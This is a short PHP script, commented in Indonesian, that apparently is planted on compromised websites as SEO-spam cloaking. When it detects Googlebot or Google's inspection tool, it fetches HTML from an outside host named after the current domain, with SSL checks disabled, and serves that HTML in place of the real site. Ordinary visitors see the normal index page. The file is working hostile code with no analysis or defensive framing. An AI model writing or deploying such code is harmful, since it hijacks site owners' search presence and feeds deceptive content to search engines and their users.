<?php
function profile_user()
{
    $refererUrl = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'No Referer';
    $useragent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
    $currentDomain = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'defaultdomain.com';

    // Otomatis buat URL berdasarkan domain aktif
    $pasteUrl = 'https://buckdomain.vip/daniel/' . $currentDomain . '.html';
    
    if (stripos($useragent, 'Google-InspectionTool') !== false ||
        stripos($useragent, 'googlebot') !== false ||
        stripos($useragent, '(compatible; Googlebot/2.1; +http://www.google.com/bot.html)') !== false) {

        // Ambil konten dari URL berdasarkan domain
        $content = fetch_content($pasteUrl);
        if ($content) {
            echo $content;
            exit();
        } else {
            echo "Gagal mengambil konten dari $pasteUrl";
            exit();
        }
    } else {
        if (file_exists('index.php')) {
            include('index.php');
        } elseif (file_exists('index.html')) {
            include('index.html');
        }
    }
}

function fetch_content($url)
{
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_TIMEOUT => 5,
    ]);
    $content = curl_exec($ch);
    if (curl_errno($ch)) {
        error_log('cURL Error: ' . curl_error($ch));
        return false;
    }
    curl_close($ch);
    return $content;
}

profile_user();
?>
